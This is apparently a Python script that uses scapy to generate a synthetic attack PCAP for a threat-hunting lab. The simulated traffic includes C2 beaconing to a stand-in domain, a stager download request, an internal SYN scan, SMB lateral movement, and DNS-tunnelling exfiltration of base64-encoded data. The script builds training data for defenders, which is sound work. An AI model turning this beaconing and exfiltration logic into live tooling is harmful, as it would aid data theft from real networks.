#!/usr/bin/env python3
"""
Generate a synthetic attack PCAP for the threat hunt lab.
Produces traffic matching the kill chain timeline:
  - Normal web browsing noise
  - DNS C2 beaconing (30s intervals to update-service.xyz)
  - SMB lateral movement (VLAN 20 → VLAN 30)
  - DNS tunneling exfiltration (base64 in subdomain labels)
  - Discovery scan (SYN sweep of internal range)

Requires: pip install scapy
Usage: python3 generate_pcap.py [output.pcap]
"""

import sys
import time
import base64
import random
import struct
from datetime import datetime, timedelta

try:
    from scapy.all import (
        IP, TCP, UDP, DNS, DNSQR, DNSRR, Ether, Raw,
        wrpcap, RandMAC, conf
    )
except ImportError:
    print("Install scapy: pip install scapy")
    sys.exit(1)

conf.verb = 0  # silence scapy

OUTPUT = sys.argv[1] if len(sys.argv) > 1 else "attack.pcap"

# --- Network topology ---
VICTIM_IP = "172.20.1.50"       # Compromised kiosk (VLAN 20)
VICTIM_MAC = "00:15:5d:01:04:01"
GW_IP = "172.20.1.1"            # Gateway
GW_MAC = "00:15:5d:00:00:01"
DNS_SERVER = "8.8.8.8"
C2_DOMAIN = "update-service.xyz"
C2_IP = "203.0.113.99"          # External C2 server
RELIEF_IP = "10.10.30.5"        # Relief ops file server (VLAN 30)
INTERNAL_RANGE = "10.10.30"     # Scan target range

# --- Timing ---
BASE_TIME = datetime(2026, 3, 14, 14, 23, 0)  # Attack start
packets = []


def ts(offset_seconds):
    """Return epoch timestamp at offset from base."""
    return (BASE_TIME + timedelta(seconds=offset_seconds)).timestamp()


def add_pkt(pkt, offset_seconds):
    """Add packet with timestamp."""
    pkt.time = ts(offset_seconds)
    packets.append(pkt)


print(f"[*] Generating attack PCAP: {OUTPUT}")

# === PHASE 1: Normal browsing noise (background, throughout) ===
print("[+] Generating background noise...")
noise_domains = [
    "www.google.com", "www.youtube.com", "cdn.jsdelivr.net",
    "fonts.googleapis.com", "www.reddit.com", "api.openai.com",
    "weather.com", "news.ycombinator.com", "stackoverflow.com",
]
for i in range(200):
    t = random.randint(0, 5640)  # Spread over 94 minutes
    domain = random.choice(noise_domains)
    # DNS query
    add_pkt(
        Ether(src=VICTIM_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=DNS_SERVER) /
        UDP(sport=random.randint(49152, 65535), dport=53) /
        DNS(rd=1, qd=DNSQR(qname=domain)),
        t
    )

# === PHASE 2: Initial C2 callback (t+180s = 14:26) ===
print("[+] C2 initial callback...")
add_pkt(
    Ether(src=VICTIM_MAC, dst=GW_MAC) /
    IP(src=VICTIM_IP, dst=DNS_SERVER) /
    UDP(sport=51234, dport=53) /
    DNS(rd=1, qd=DNSQR(qname=C2_DOMAIN)),
    180
)
# HTTP GET to C2 (stager download)
add_pkt(
    Ether(src=VICTIM_MAC, dst=GW_MAC) /
    IP(src=VICTIM_IP, dst=C2_IP) /
    TCP(sport=49200, dport=80, flags="S"),
    182
)
add_pkt(
    Ether(src=GW_MAC, dst=VICTIM_MAC) /
    IP(src=C2_IP, dst=VICTIM_IP) /
    TCP(sport=80, dport=49200, flags="SA"),
    182.1
)
add_pkt(
    Ether(src=VICTIM_MAC, dst=GW_MAC) /
    IP(src=VICTIM_IP, dst=C2_IP) /
    TCP(sport=49200, dport=80, flags="A") /
    Raw(load=b"GET /stager HTTP/1.1\r\nHost: update-service.xyz\r\nUser-Agent: Mozilla/5.0\r\n\r\n"),
    182.2
)

# === PHASE 3: Discovery scan (t+720s = 14:35) ===
print("[+] Discovery port scan...")
for i in range(1, 30):
    target = f"{INTERNAL_RANGE}.{i}"
    for port in [22, 80, 445, 3389]:
        add_pkt(
            Ether(src=VICTIM_MAC, dst=GW_MAC) /
            IP(src=VICTIM_IP, dst=target, ttl=128) /
            TCP(sport=random.randint(49152, 65535), dport=port, flags="S"),
            720 + i * 0.5 + port * 0.01
        )

# === PHASE 4: SMB Lateral Movement (t+1320s = 14:45) ===
print("[+] SMB lateral movement...")
# TCP handshake to SMB
add_pkt(
    Ether(src=VICTIM_MAC, dst=GW_MAC) /
    IP(src=VICTIM_IP, dst=RELIEF_IP, ttl=128) /
    TCP(sport=49300, dport=445, flags="S"),
    1320
)
add_pkt(
    Ether(src=GW_MAC, dst=VICTIM_MAC) /
    IP(src=RELIEF_IP, dst=VICTIM_IP, ttl=128) /
    TCP(sport=445, dport=49300, flags="SA"),
    1320.1
)
add_pkt(
    Ether(src=VICTIM_MAC, dst=GW_MAC) /
    IP(src=VICTIM_IP, dst=RELIEF_IP, ttl=128) /
    TCP(sport=49300, dport=445, flags="A"),
    1320.2
)
# SMB data transfer (simplified)
for i in range(10):
    add_pkt(
        Ether(src=VICTIM_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=RELIEF_IP, ttl=128) /
        TCP(sport=49300, dport=445, flags="PA") /
        Raw(load=b"\x00" * 1400),
        1325 + i * 0.5
    )

# === PHASE 5: DNS C2 Beaconing (t+1620s = 14:50, every 30s) ===
print("[+] DNS C2 beaconing (30s intervals)...")
beacon_start = 1620
for i in range(120):  # 120 beacons over 60 minutes
    t = beacon_start + i * 30
    if t > 5640:  # Don't go past 94 min
        break
    # DNS query
    add_pkt(
        Ether(src=VICTIM_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=DNS_SERVER) /
        UDP(sport=random.randint(49152, 65535), dport=53) /
        DNS(rd=1, qd=DNSQR(qname=f"beacon.{C2_DOMAIN}")),
        t
    )
    # DNS TXT response (C2 command)
    add_pkt(
        Ether(src=GW_MAC, dst=VICTIM_MAC) /
        IP(src=DNS_SERVER, dst=VICTIM_IP) /
        UDP(sport=53, dport=random.randint(49152, 65535)) /
        DNS(
            qr=1, aa=1,
            qd=DNSQR(qname=f"beacon.{C2_DOMAIN}"),
            an=DNSRR(rrname=f"beacon.{C2_DOMAIN}", type="TXT", rdata="OK")
        ),
        t + 0.05
    )

# === PHASE 6: DNS Tunneling Exfiltration (t+3420s = 15:00) ===
print("[+] DNS tunneling exfiltration...")
# Simulate exfiltrating a certificate file
exfil_data = b"-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJAP4LF4VPmNSzMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV\nBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX\naWRnaXRzIFB0eSBMdGQwHhcNMjQwMTAxMDAwMDAwWhcNMjUwMTAxMDAwMDAwWjBF\n-----END CERTIFICATE-----\n"

chunks = []
# Split into 50-byte chunks and base64 encode
for i in range(0, len(exfil_data), 50):
    chunk = base64.b64encode(exfil_data[i:i+50]).decode().rstrip("=")
    chunks.append(chunk)

exfil_start = 3420
for i, chunk in enumerate(chunks):
    t = exfil_start + i * 15  # Every 15 seconds
    subdomain = f"{chunk}.data.{C2_DOMAIN}"
    add_pkt(
        Ether(src=VICTIM_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=DNS_SERVER) /
        UDP(sport=random.randint(49152, 65535), dport=53) /
        DNS(rd=1, qd=DNSQR(qname=subdomain)),
        t
    )
    # Response
    add_pkt(
        Ether(src=GW_MAC, dst=VICTIM_MAC) /
        IP(src=DNS_SERVER, dst=VICTIM_IP) /
        UDP(sport=53, dport=random.randint(49152, 65535)) /
        DNS(qr=1, qd=DNSQR(qname=subdomain), an=DNSRR(rrname=subdomain, type="A", rdata="127.0.0.1")),
        t + 0.03
    )

# === Sort and write ===
packets.sort(key=lambda p: p.time)
print(f"[+] Writing {len(packets)} packets to {OUTPUT}")
wrpcap(OUTPUT, packets)

# Stats
total_time = (packets[-1].time - packets[0].time)
print(f"[*] PCAP spans {total_time:.0f} seconds ({total_time/60:.0f} minutes)")
print(f"[*] DNS beacons: ~{120} (30s interval)")
print(f"[*] DNS exfil queries: {len(chunks)} (base64 chunks)")
print(f"[*] SMB sessions: 1 (to {RELIEF_IP})")
print(f"[*] Discovery scan targets: 29 hosts, 4 ports each")
print(f"[*] Done.")
